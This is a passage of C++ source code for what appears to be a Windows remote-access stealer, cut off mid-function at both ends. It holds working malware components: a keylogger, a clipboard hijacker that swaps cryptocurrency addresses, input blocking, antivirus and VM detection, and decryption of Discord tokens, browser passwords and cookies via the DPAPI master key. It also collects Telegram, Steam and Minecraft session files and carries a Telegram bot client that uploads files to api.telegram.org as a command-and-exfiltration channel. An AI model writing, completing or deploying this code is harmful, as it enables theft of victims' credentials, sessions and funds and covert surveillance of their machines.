                files.push_back(entry.path().filename().string());
            }
        } catch (...) {
            // Handle 
        }
        
        return files;
    }

    static bool copyFile(const string& src, const string& dst) {
        try {
            fs::copy(src, dst, fs::copy_options::overwrite_existing);
            return true;
        } catch (...) {
            return false;
        }
    }

    static bool deleteFile(const string& path) {
        try {
            fs::remove_all(path);
            return true;
        } catch (...) {
            return false;
        }
    }

    static bool encryptFile(const string& filePath, const string& key) {
        ifstream inFile(filePath, ios::binary);
        if (!inFile.is_open()) return false;
        
        string content((istreambuf_iterator<char>(inFile)), istreambuf_iterator<char>());
        inFile.close();
        
        string encrypted = Utils::aesEncrypt(content, key);
        
        ofstream outFile(filePath, ios::binary);
        if (!outFile.is_open()) return false;
        
        outFile << encrypted;
        outFile.close();
        
        return true;
    }

    static bool decryptFile(const string& filePath, const string& key) {
        ifstream inFile(filePath, ios::binary);
        if (!inFile.is_open()) return false;
        
        string encrypted((istreambuf_iterator<char>(inFile)), istreambuf_iterator<char>());
        inFile.close();
        
        string decrypted = Utils::aesDecrypt(encrypted, key);
        if (decrypted.empty()) return false;
        
        ofstream outFile(filePath, ios::binary);
        if (!outFile.is_open()) return false;
        
        outFile << decrypted;
        outFile.close();
        
        return true;
    }

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && isInputBlocked) {
            return 1; // Block the key
        }
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && isInputBlocked) {
            return 1; // Block the mouse event
        }
        return CallNextHookEx(mouseHook, nCode, wParam, lParam);
    }

    static bool blockInput(bool block) {
        if (block) {
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
            mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
            isInputBlocked = true;
            ::BlockInput(TRUE);
        } else {
            if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
            if (mouseHook) UnhookWindowsHookEx(mouseHook);
            isInputBlocked = false;
            ::BlockInput(FALSE);
        }
        return true;
    }

    static string getClipboardText() {
        if (!OpenClipboard(NULL)) return "";
        
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == NULL) {
            CloseClipboard();
            return "";
        }
        
        char* pszText = static_cast<char*>(GlobalLock(hData));
        string text(pszText ? pszText : "");
        
        GlobalUnlock(hData);
        CloseClipboard();
        
        return text;
    }

    static bool setClipboardText(const string& text) {
        if (!OpenClipboard(NULL)) return false;
        
        EmptyClipboard();
        
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, text.length() + 1);
        if (hGlobal == NULL) {
            CloseClipboard();
            return false;
        }
        
        char* pGlobal = static_cast<char*>(GlobalLock(hGlobal));
        strcpy_s(pGlobal, text.length() + 1, text.c_str());
        
        GlobalUnlock(hGlobal);
        SetClipboardData(CF_TEXT, hGlobal);
        
        CloseClipboard();
        return true;
    }

    static void startClipboardMonitor() {
        thread([]() {
            string lastClipboard = "";
            
            while (true) {
                string current = getClipboardText();
                if (!current.empty() && current != lastClipboard) {
                    clipboardHistory.push_back(current);
                    lastClipboard = current;
                }
                this_thread::sleep_for(chrono::milliseconds(500));
            }
        }).detach();
    }

    static vector<string> getClipboardHistory() {
        return clipboardHistory;
    }

    static bool startCryptoClipper(const map<string, string>& replacements) {
        thread([replacements]() {
            while (true) {
                string clipboard = getClipboardText();
                
                for (const auto& [original, replacement] : replacements) {
                    if (clipboard.find(original) != string::npos) {
                        size_t pos = clipboard.find(original);
                        string newClipboard = clipboard;
                        newClipboard.replace(pos, original.length(), replacement);
                        setClipboardText(newClipboard);
                        break;
                    }
                }
                
                this_thread::sleep_for(chrono::milliseconds(1000));
            }
        }).detach();
        
        return true;
    }

    static string keylogBuffer;
    static bool isKeylogging;

    static LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            
            WCHAR key[16];
            int result = ToUnicode(pKeyStruct->vkCode, pKeyStruct->scanCode, 
                                 keyboardState, key, 16, 0);
            
            if (result > 0) {
                wstring wkey(key, result);
                string skey(wkey.begin(), wkey.end());
                keylogBuffer += skey;
                
                if (keylogBuffer.length() > 100) {
                    saveKeylog();
                }
            } else {
                if (pKeyStruct->vkCode == VK_RETURN) keylogBuffer += "\n";
                else if (pKeyStruct->vkCode == VK_TAB) keylogBuffer += "\t";
                else if (pKeyStruct->vkCode == VK_SPACE) keylogBuffer += " ";
                else if (pKeyStruct->vkCode == VK_BACK) {
                    if (!keylogBuffer.empty()) keylogBuffer.pop_back();
                }
            }
        }
        
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    static void saveKeylog() {
        string logPath = Utils::getTempPath() + "\\keylog.txt";
        ofstream logFile(logPath, ios::app);
        if (logFile.is_open()) {
            logFile << keylogBuffer;
            logFile.close();
            keylogBuffer.clear();
        }
    }

    static bool startKeylogger() {
        if (isKeylogging) return false;
        
        isKeylogging = true;
        thread([]() {
            HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggerProc, NULL, 0);
            
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) && isKeylogging) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            
            UnhookWindowsHookEx(hHook);
        }).detach();
        
        return true;
    }

    static bool stopKeylogger() {
        isKeylogging = false;
        saveKeylog();
        return true;
    }

    static SystemInfo getSystemInfo() {
        SystemInfo info;
        
        info.computerName = Utils::getComputerName();
        info.userName = Utils::getUserName();
        info.ipAddress = Utils::getIPAddress();
        info.macAddress = Utils::getMACAddress();
        info.isAdmin = PrivilegeManager::isRunningAsAdmin();
        info.isVM = isVirtualMachine();
        
        OSVERSIONINFOEX osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        GetVersionEx((OSVERSIONINFO*)&osvi);
        
        info.osVersion = "Windows " + to_string(osvi.dwMajorVersion) + "." + 
                        to_string(osvi.dwMinorVersion) + " Build " + 
                        to_string(osvi.dwBuildNumber);
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        info.cpuInfo = to_string(sysInfo.dwNumberOfProcessors) + " cores";        
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        info.ramGB = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
        
        info.installedSoftware = getInstalledSoftware();
        
        info.antivirus = getAntivirusInfo();
        
        TIME_ZONE_INFORMATION tzInfo;
        GetTimeZoneInformation(&tzInfo);
        info.timeZone = tzInfo.StandardName;
        
        return info;
    }

    static vector<string> getInstalledSoftware() {
        vector<string> software;
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            char subkeyName[255];
            DWORD subkeyNameSize = sizeof(subkeyName);
            DWORD index = 0;
            
            while (RegEnumKeyExA(hKey, index, subkeyName, &subkeyNameSize, 
                               NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, subkeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    
                    char displayName[255];
                    DWORD displayNameSize = sizeof(displayName);
                    
                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, 
                                        (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
                        software.push_back(displayName);
                    }
                    
                    RegCloseKey(hSubKey);
                }
                
                index++;
                subkeyNameSize = sizeof(subkeyName);
            }
            
            RegCloseKey(hKey);
        }
        
        return software;
    }

    static string getAntivirusInfo() {
        vector<string> avProcesses = {
            "MsMpEng.exe",   // Windows Defender
            "avp.exe",       // Kaspersky
            "bdagent.exe",   // BitDefender
            "avastui.exe",   // Avast
            "avgui.exe",     // AVG
            "mbam.exe",      // Malwarebytes
            "hips.exe",      // McAfee
            "SophosUI.exe",  // Sophos
            "TaniumClient.exe" // Tanium
        };
        
        for (const auto& proc : avProcesses) {
            if (Utils::isProcessRunning(proc)) {
                return proc;
            }
        }
        
        return "Unknown or None";
    }
};

HHOOK SystemController::keyboardHook = NULL;
HHOOK SystemController::mouseHook = NULL;
bool SystemController::isInputBlocked = false;
vector<string> SystemController::clipboardHistory;
string SystemController::keylogBuffer;
bool SystemController::isKeylogging = false;

class DiscordTokenExtractor {
private:
    static string getMasterKey(const string& localStatePath) {
        ifstream file(localStatePath);
        if (!file.is_open()) return "";
        
        Json::Value root;
        Json::CharReaderBuilder builder;
        JSONCPP_STRING errors;
        
        if (!Json::parseFromStream(builder, file, &root, &errors)) {
            return "";
        }
        
        string encryptedKey = root["os_crypt"]["encrypted_key"].asString();
        
        string decoded = Utils::base64Decode(encryptedKey);
        
        // Remove DPAPI prefix
        if (decoded.length() > 5 && decoded.substr(0, 5) == "DPAPI") {
            decoded = decoded.substr(5);
        }
        
        DATA_BLOB in, out;
        in.pbData = (BYTE*)&decoded[0];
        in.cbData = decoded.length();
        
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            string masterKey((char*)out.pbData, out.cbData);
            LocalFree(out.pbData);
            return masterKey;
        }
        
        return "";
    }

    static string decryptToken(const string& encrypted, const string& masterKey) {
        if (encrypted.length() < 15) return "";
        
        try {
            string iv = encrypted.substr(3, 12);
            string payload = encrypted.substr(15);
            
            EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
            EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, 
                              (const unsigned char*)masterKey.c_str(), 
                              (const unsigned char*)iv.c_str());
            
            string decrypted;
            decrypted.resize(payload.length() - 16);
            
            int len;
            EVP_DecryptUpdate(ctx, (unsigned char*)&decrypted[0], &len, 
                             (const unsigned char*)payload.c_str(), payload.length() - 16);
            
            EVP_CIPHER_CTX_free(ctx);
            return decrypted;
        } catch (...) {
            return "";
        }
    }

public:
    static map<string, vector<string>> extractAllTokens() {
        map<string, vector<string>> tokens;
        
        // Discord paths
        vector<pair<string, string>> discordPaths = {
            {"Discord", Utils::getAppDataPath() + "\\discord"},
            {"Discord Canary", Utils::getAppDataPath() + "\\discordcanary"},
            {"Discord PTB", Utils::getAppDataPath() + "\\discordptb"},
            {"Discord Development", Utils::getAppDataPath() + "\\discorddevelopment"}
        };
        
        // Browser paths
        vector<pair<string, string>> browserPaths = {
            {"Chrome", Utils::getLocalAppDataPath() + "\\Google\\Chrome\\User Data\\Default"},
            {"Edge", Utils::getLocalAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default"},
            {"Brave", Utils::getLocalAppDataPath() + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
            {"Opera", Utils::getAppDataPath() + "\\Opera Software\\Opera Stable"},
            {"Yandex", Utils::getLocalAppDataPath() + "\\Yandex\\YandexBrowser\\User Data\\Default"},
            {"Vivaldi", Utils::getLocalAppDataPath() + "\\Vivaldi\\User Data\\Default"}
        };
        
        regex tokenPattern("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
        regex encryptedPattern("dQw4w9WgXcQ:[^\"]*");
        
        // Extract from Discord clients
        for (const auto& [name, basePath] : discordPaths) {
            string leveldbPath = basePath + "\\Local Storage\\leveldb\\";
            string localStatePath = basePath + "\\Local State";
            
            if (fs::exists(leveldbPath)) {
                vector<string> discordTokens = extractFromLevelDB(leveldbPath, localStatePath);
                if (!discordTokens.empty()) {
                    tokens[name] = discordTokens;
                }
            }
        }
        
        // Extract from browsers
        for (const auto& [name, basePath] : browserPaths) {
            string leveldbPath = basePath + "\\Local Storage\\leveldb\\";
            string localStatePath = basePath + "\\Local State";
            
            if (fs::exists(leveldbPath)) {
                vector<string> browserTokens = extractFromLevelDB(leveldbPath, localStatePath);
                if (!browserTokens.empty()) {
                    tokens[name + " Browser"] = browserTokens;
                }
            }
        }
        
        return tokens;
    }

    static vector<string> extractFromLevelDB(const string& leveldbPath, const string& localStatePath) {
        vector<string> tokens;
        string masterKey = getMasterKey(localStatePath);
        
        regex tokenPattern("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
        regex encryptedPattern("dQw4w9WgXcQ:[^\"]*");
        
        try {
            for (const auto& entry : fs::directory_iterator(leveldbPath)) {
                if (entry.path().extension() == ".ldb" || 
                    entry.path().extension() == ".log") {
                    
                    ifstream file(entry.path().string(), ios::binary);
                    string content((istreambuf_iterator<char>(file)), 
                                   istreambuf_iterator<char>());
                    
                    smatch matches;
                    string::const_iterator searchStart(content.cbegin());
                    
                    while (regex_search(searchStart, content.cend(), matches, tokenPattern)) {
                        string token = matches[0];
                        tokens.push_back(token);
                        searchStart = matches.suffix().first;
                    }
                    
                    searchStart = content.cbegin();
                    while (regex_search(searchStart, content.cend(), matches, encryptedPattern)) {
                        string encrypted = matches[0];
                        encrypted = encrypted.substr(12); // Remove "dQw4w9WgXcQ:"
                        
                        string decoded = Utils::base64Decode(encrypted);
                        if (!masterKey.empty()) {
                            string decrypted = decryptToken(decoded, masterKey);
                            if (!decrypted.empty()) {
                                tokens.push_back(decrypted);
                            }
                        }
                        
                        searchStart = matches.suffix().first;
                    }
                }
            }
        } catch (...) {
            // Ignore errors
        }
        
        sort(tokens.begin(), tokens.end());
        tokens.erase(unique(tokens.begin(), tokens.end()), tokens.end());
        
        return tokens;
    }
};

class BrowserDataExtractor {
private:
    struct BrowserData {
        vector<map<string, string>> logins;
        vector<map<string, string>> cookies;
        vector<map<string, string>> history;
        vector<map<string, string>> downloads;
        vector<map<string, string>> creditCards;
        vector<map<string, string>> autofill;
    };

    static string decryptValue(const string& encrypted, const string& masterKey) {
        if (encrypted.empty() || masterKey.empty()) return "";
        
        try {
            if (encrypted.length() > 15 && 
                (encrypted.substr(0, 3) == "v10" || encrypted.substr(0, 3) == "v11")) {
                
                string iv = encrypted.substr(3, 12);
                string payload = encrypted.substr(15);
                
                EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
                EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL,
                                 (const unsigned char*)masterKey.c_str(),
                                 (const unsigned char*)iv.c_str());
                
                string decrypted;
                decrypted.resize(payload.length() - 16);
                
                int len;
                EVP_DecryptUpdate(ctx, (unsigned char*)&decrypted[0], &len,
                                 (const unsigned char*)payload.c_str(), payload.length() - 16);
                
                EVP_CIPHER_CTX_free(ctx);
                return decrypted;
            }
        } catch (...) {
            // Try DPAPI
            DATA_BLOB in, out;
            in.pbData = (BYTE*)encrypted.c_str();
            in.cbData = encrypted.length();
            
            if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                string decrypted((char*)out.pbData, out.cbData);
                LocalFree(out.pbData);
                return decrypted;
            }
        }
        
        return "";
    }

    static string getMasterKey(const string& localStatePath) {
        if (!fs::exists(localStatePath)) return "";
        
        ifstream file(localStatePath);
        if (!file.is_open()) return "";
        
        Json::Value root;
        Json::CharReaderBuilder builder;
        JSONCPP_STRING errors;
        
        if (!Json::parseFromStream(builder, file, &root, &errors)) {
            return "";
        }
        
        if (!root.isMember("os_crypt") || !root["os_crypt"].isMember("encrypted_key")) {
            return "";
        }
        
        string encryptedKey = root["os_crypt"]["encrypted_key"].asString();
        string decoded = Utils::base64Decode(encryptedKey);
        
        if (decoded.length() > 5 && decoded.substr(0, 5) == "DPAPI") {
            decoded = decoded.substr(5);
        }
        
        DATA_BLOB in, out;
        in.pbData = (BYTE*)&decoded[0];
        in.cbData = decoded.length();
        
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            string masterKey((char*)out.pbData, out.cbData);
            LocalFree(out.pbData);
            return masterKey;
        }
        
        return "";
    }

    static vector<map<string, string>> extractLogins(const string& loginDB, const string& masterKey) {
        vector<map<string, string>> logins;
        
        if (!fs::exists(loginDB)) return logins;
        
        string tempDB = Utils::getTempPath() + "\\temp_login.db";
        fs::copy(loginDB, tempDB, fs::copy_options::overwrite_existing);
        
        sqlite3* db;
        if (sqlite3_open(tempDB.c_str(), &db) != SQLITE_OK) {
            fs::remove(tempDB);
            return logins;
        }
        
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                map<string, string> login;
                
                const unsigned char* url = sqlite3_column_text(stmt, 0);
                const unsigned char* username = sqlite3_column_text(stmt, 1);
                const void* passwordBlob = sqlite3_column_blob(stmt, 2);
                int passwordSize = sqlite3_column_bytes(stmt, 2);
                
                if (url) login["url"] = string((char*)url);
                if (username) login["username"] = string((char*)username);
                
                if (passwordBlob && passwordSize > 0) {
                    string encrypted((char*)passwordBlob, passwordSize);
                    string password = decryptValue(encrypted, masterKey);
                    login["password"] = password;
                }
                
                if (!login.empty()) {
                    logins.push_back(login);
                }
            }
        }
        
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        fs::remove(tempDB);
        
        return logins;
    }

    static vector<map<string, string>> extractCookies(const string& cookieDB, const string& masterKey) {
        vector<map<string, string>> cookies;
        
        if (!fs::exists(cookieDB)) return cookies;
        
        string tempDB = Utils::getTempPath() + "\\temp_cookies.db";
        fs::copy(cookieDB, tempDB, fs::copy_options::overwrite_existing);
        
        sqlite3* db;
        if (sqlite3_open(tempDB.c_str(), &db) != SQLITE_OK) {
            fs::remove(tempDB);
            return cookies;
        }
        
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, encrypted_value, expires_utc FROM cookies";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                map<string, string> cookie;
                
                const unsigned char* host = sqlite3_column_text(stmt, 0);
                const unsigned char* name = sqlite3_column_text(stmt, 1);
                const void* valueBlob = sqlite3_column_blob(stmt, 2);
                int valueSize = sqlite3_column_bytes(stmt, 2);
                sqlite3_int64 expires = sqlite3_column_int64(stmt, 3);
                
                if (host) cookie["host"] = string((char*)host);
                if (name) cookie["name"] = string((char*)name);
                
                if (valueBlob && valueSize > 0) {
                    string encrypted((char*)valueBlob, valueSize);
                    string value = decryptValue(encrypted, masterKey);
                    cookie["value"] = value;
                }
                
                cookie["expires"] = to_string(expires);
                
                if (!cookie.empty()) {
                    cookies.push_back(cookie);
                }
            }
        }
        
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        fs::remove(tempDB);
        
        return cookies;
    }

public:
    static map<string, BrowserData> extractAllBrowserData() {
        map<string, BrowserData> allData;
        
        // Browser paths
        vector<pair<string, string>> browserPaths = {
            {"Chrome", Utils::getLocalAppDataPath() + "\\Google\\Chrome\\User Data\\Default"},
            {"Edge", Utils::getLocalAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default"},
            {"Brave", Utils::getLocalAppDataPath() + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
            {"Opera", Utils::getAppDataPath() + "\\Opera Software\\Opera Stable"},
            {"Yandex", Utils::getLocalAppDataPath() + "\\Yandex\\YandexBrowser\\User Data\\Default"},
            {"Vivaldi", Utils::getLocalAppDataPath() + "\\Vivaldi\\User Data\\Default"},
            {"Chromium", Utils::getLocalAppDataPath() + "\\Chromium\\User Data\\Default"}
        };
        
        for (const auto& [name, basePath] : browserPaths) {
            if (!fs::exists(basePath)) continue;
            
            BrowserData data;
            string localStatePath = fs::path(basePath).parent_path().string() + "\\Local State";
            string masterKey = getMasterKey(localStatePath);
            
            // Extract logins
            string loginDB = basePath + "\\Login Data";
            data.logins = extractLogins(loginDB, masterKey);
            
            // Extract cookies
            string cookieDB = basePath + "\\Network\\Cookies";
            data.cookies = extractCookies(cookieDB, masterKey);
            
            // Extract history
            string historyDB = basePath + "\\History";
            // Similar extraction for history
            
            if (!data.logins.empty() || !data.cookies.empty()) {
                allData[name] = data;
            }
        }
        
        return allData;
    }
};

class TelegramSessionExtractor {
public:
    static vector<string> extractSessions() {
        vector<string> sessions;
        
        string telegramPath = Utils::getAppDataPath() + "\\Telegram Desktop\\tdata";
        if (!fs::exists(telegramPath)) return sessions;
        
        vector<string> sessionFiles = {
            "D877F783D5D3EF8C",  // Main session
            "D877F783D5D3EF8?*",  // Session patterns
        };
        
        try {
            for (const auto& pattern : sessionFiles) {
                for (const auto& entry : fs::directory_iterator(telegramPath)) {
                    if (entry.path().filename().string().find("D877F783D5D3EF8") == 0) {
                        sessions.push_back(entry.path().string());
                    }
                }
            }
        } catch (...) {
        }
        
        return sessions;
    }
};

class SteamSessionExtractor {
public:
    static vector<string> extractSessions() {
        vector<string> sessions;
        
        string steamPath = Utils::getLocalAppDataPath() + "\\Steam";
        if (!fs::exists(steamPath)) return sessions;
        
        // Look for Steam session files
        vector<string> steamFiles = {
            "config\\loginusers.vdf",
            "config\\config.vdf",
            "ssfn*",
            "steam.dll"
        };
        
        for (const auto& file : steamFiles) {
            try {
                if (file.find("*") != string::npos) {
                    // Wildcard pattern
                    string pattern = steamPath + "\\" + file;
                    WIN32_FIND_DATAA findData;
                    HANDLE hFind = FindFirstFileA(pattern.c_str(), &findData);
                    
                    if (hFind != INVALID_HANDLE_VALUE) {
                        do {
                            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                sessions.push_back(steamPath + "\\" + findData.cFileName);
                            }
                        } while (FindNextFileA(hFind, &findData));
                        
                        FindClose(hFind);
                    }
                } else {
                    string fullPath = steamPath + "\\" + file;
                    if (fs::exists(fullPath)) {
                        sessions.push_back(fullPath);
                    }
                }
            } catch (...) {
                
            }
        }
        
        return sessions;
    }
};

class MinecraftSessionExtractor {
public:
    static vector<string> extractSessions() {
        vector<string> sessions;
        
        string minecraftPath = Utils::getAppDataPath() + "\\.minecraft";
        if (!fs::exists(minecraftPath)) return sessions;
        
        vector<string> mcFiles = {
            "launcher_accounts.json",
            "launcher_profiles.json",
            "usercache.json"
        };
        
        for (const auto& file : mcFiles) {
            string fullPath = minecraftPath + "\\" + file;
            if (fs::exists(fullPath)) {
                sessions.push_back(fullPath);
            }
        }
        
        return sessions;
    }
};

class TelegramBot {
private:
    string botToken;
    mutex sendMutex;
    atomic<long long> lastUpdateId;
    
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    
    string escapeJSON(const string& s) {
        ostringstream o;
        for (auto c : s) {
            switch (c) {
                case '"': o << "\\\""; break;
                case '\\': o << "\\\\"; break;
                case '\b': o << "\\b"; break;
                case '\f': o << "\\f"; break;
                case '\n': o << "\\n"; break;
                case '\r': o << "\\r"; break;
                case '\t': o << "\\t"; break;
                default:
                    if ('\x00' <= c && c <= '\x1f') {
                        o << "\\u" << hex << setw(4) << setfill('0') << (int)c;
                    } else {
                        o << c;
                    }
            }
        }
        return o.str();
    }
    
    string escapeMarkdown(const string& s) {
        string escaped = s;
        vector<char> specialChars = {'_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'};
        
        for (char c : specialChars) {
            string search = string(1, c);
            string replace = "\\" + search;
            size_t pos = 0;
            while ((pos = escaped.find(search, pos)) != string::npos) {
                escaped.replace(pos, search.length(), replace);
                pos += replace.length();
            }
        }
        
        return escaped;
    }
    
public:
    TelegramBot(const string& token) : botToken(token), lastUpdateId(0) {
        curl_global_init(CURL_GLOBAL_ALL);
    }
    
    ~TelegramBot() {
        curl_global_cleanup();
    }
    
    Json::Value getUpdates(int timeout = 60) {
        CURL* curl = curl_easy_init();
        if (!curl) return Json::Value();
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/getUpdates?timeout=" + 
                    to_string(timeout) + "&offset=" + to_string(lastUpdateId + 1);
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout + 5);
        
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        if (res != CURLE_OK || readBuffer.empty()) {
            return Json::Value();
        }
        
        Json::Value root;
        Json::CharReaderBuilder builder;
        JSONCPP_STRING errors;
        stringstream ss(readBuffer);
        
        if (!Json::parseFromStream(builder, ss, &root, &errors)) {
            return Json::Value();
        }
        
        if (root["ok"].asBool() && root.isMember("result")) {
            for (const auto& update : root["result"]) {
                long long updateId = update["update_id"].asInt64();
                if (updateId > lastUpdateId) {
                    lastUpdateId = updateId;
                }
            }
        }
        
        return root;
    }
    
    bool sendMessage(long long chatId, const string& text, bool markdown = false, 
                    long long replyTo = 0, const string& parseMode = "") {
        lock_guard<mutex> lock(sendMutex);
        
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        
        string escapedText = escapeJSON(markdown ? escapeMarkdown(text) : text);
        string jsonData = "{\"chat_id\":" + to_string(chatId) + 
                         ",\"text\":\"" + escapedText + "\"";
        
        if (markdown && parseMode.empty()) {
            jsonData += ",\"parse_mode\":\"Markdown\"";
        } else if (!parseMode.empty()) {
            jsonData += ",\"parse_mode\":\"" + parseMode + "\"";
        }
        
        if (replyTo > 0) {
            jsonData += ",\"reply_to_message_id\":" + to_string(replyTo);
        }
        
        jsonData += "}";
        
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10);
        
        CURLcode res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    bool sendDocument(long long chatId, const string& filePath, const string& caption = "", 
                     bool markdown = false) {
        lock_guard<mutex> lock(sendMutex);
        
        if (!fs::exists(filePath)) return false;
        
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
        
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;
        
        // Add chat_id
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, to_string(chatId).c_str(), CURL_ZERO_TERMINATED);
        
        // Add document
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "document");
        curl_mime_filedata(part, filePath.c_str());
        
        // Add caption if provided
        if (!caption.empty()) {
            part = curl_mime_addpart(mime);
            curl_mime_name(part, "caption");
            string escapedCaption = markdown ? escapeMarkdown(caption) : caption;
            curl_mime_data(part, escapedCaption.c_str(), CURL_ZERO_TERMINATED);
            
            if (markdown) {
                part = curl_mime_addpart(mime);
                curl_mime_name(part, "parse_mode");
                curl_mime_data(part, "Markdown", CURL_ZERO_TERMINATED);
            }
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30);
        
        CURLcode res = curl_easy_perform(curl);
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    bool sendPhoto(long long chatId, const string& photoPath, const string& caption = "", 
                  bool markdown = false) {
        lock_guard<mutex> lock(sendMutex);
        
        if (!fs::exists(photoPath)) return false;
        
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
        
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;
        
        // Add chat_id
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, to_string(chatId).c_str(), CURL_ZERO_TERMINATED);
        
        // Add photo
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "photo");
        curl_mime_filedata(part, photoPath.c_str());
        
        // Add caption if provided
        if (!caption.empty()) {
            part = curl_mime_addpart(mime);
            curl_mime_name(part, "caption");
            string escapedCaption = markdown ? escapeMarkdown(caption) : caption;
            curl_mime_data(part, escapedCaption.c_str(), CURL_ZERO_TERMINATED);
            
            if (markdown) {
                part = curl_mime_addpart(mime);
                curl_mime_name(part, "parse_mode");
                curl_mime_data(part, "Markdown", CURL_ZERO_TERMINATED);
            }
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30);
        
        CURLcode res = curl_easy_perform(curl);
